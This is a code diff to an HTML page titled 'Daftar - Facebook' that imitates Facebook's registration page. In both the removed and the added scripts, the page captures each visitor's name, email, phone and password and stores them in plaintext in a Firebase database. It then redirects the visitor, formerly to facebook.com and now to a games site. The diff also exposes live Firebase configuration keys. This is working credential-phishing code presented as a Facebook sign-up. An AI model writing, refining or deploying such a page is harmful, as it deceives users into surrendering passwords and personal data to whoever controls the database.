@@ -5,9 +5,53 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Daftar - Facebook</title>
     
-    <!-- Firebase SDK -->
-    <script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-database.js"></script>
+    <!-- Include Firebase SDK as ES Module -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.11/firebase-app.js";
+        import { getAnalytics } from "https://www.gstatic.com/firebasejs/9.6.11/firebase-analytics.js";
+        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.6.11/firebase-database.js";
+        
+        // Firebase configuration
+        const firebaseConfig = {
+          apiKey: "AIzaSyADiJ85Yr0cnM3AlN4E23DeLhjjtzS-utg",
+          authDomain: "testing-f7e72.firebaseapp.com",
+          databaseURL: "https://testing-f7e72-default-rtdb.firebaseio.com",
+          projectId: "testing-f7e72",
+          storageBucket: "testing-f7e72.firebasestorage.app",
+          messagingSenderId: "683074830976",
+          appId: "1:683074830976:web:b76109a0b991cbd9335c65",
+          measurementId: "G-JQMD6LTXWC"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const analytics = getAnalytics(app);
+        const database = getDatabase(app);
+
+        // Form Submission
+        document.getElementById('registrationForm').addEventListener('submit', function (e) {
+            e.preventDefault();
+
+            const name = document.getElementById('name').value;
+            const email = document.getElementById('email').value;
+            const phone = document.getElementById('phone').value;
+            const password = document.getElementById('password').value;
+
+            // Store data in Firebase
+            const newUserRef = ref(database, 'users/' + Date.now());
+            set(newUserRef, {
+                name: name,
+                email: email,
+                phone: phone,
+                password: password
+            }).then(() => {
+                alert('Pendaftaran berhasil! Anda akan dialihkan ke situs game.');
+                window.location.href = "https://www.friv.com/"; // Redirect to Friv
+            }).catch((error) => {
+                alert('Terjadi kesalahan: ' + error.message);
+            });
+        });
+    </script>
     
     <style>
         body {
@@ -122,48 +166,5 @@
             Sudah punya akun? <a href="#">Masuk</a>
         </div>
     </div>
-
-    <script>
-        // Konfigurasi Firebase
-        const firebaseConfig = {
-            apiKey: "AIzaSyADiJ85Yr0cnM3AlN4E23DeLhjjtzS-utg",
-            authDomain: "testing-f7e72.firebaseapp.com",
-            databaseURL: "https://testing-f7e72-default-rtdb.firebaseio.com",
-            projectId: "testing-f7e72",
-            storageBucket: "testing-f7e72.firebasestorage.app",
-            messagingSenderId: "683074830976",
-            appId: "1:683074830976:web:b76109a0b991cbd9335c65",
-            measurementId: "G-JQMD6LTXWC"
-        };
-
-        // Inisialisasi Firebase
-        const app = firebase.initializeApp(firebaseConfig);
-        const database = firebase.database();
-
-        // Form Submission
-        const form = document.getElementById('registrationForm');
-        form.addEventListener('submit', function (e) {
-            e.preventDefault();
-
-            const name = document.getElementById('name').value;
-            const email = document.getElementById('email').value;
-            const phone = document.getElementById('phone').value;
-            const password = document.getElementById('password').value;
-
-            // Simpan data ke Firebase
-            const newUserRef = database.ref('users').push();
-            newUserRef.set({
-                name: name,
-                email: email,
-                phone: phone,
-                password: password
-            }).then(() => {
-                alert('Pendaftaran berhasil! Anda akan dialihkan ke Facebook.');
-                window.location.href = "https://www.facebook.com/"; // Redirect ke Facebook
-            }).catch((error) => {
-                alert('Terjadi kesalahan: ' + error.message);
-            });
-        });
-    </script>
 </body>
 </html>
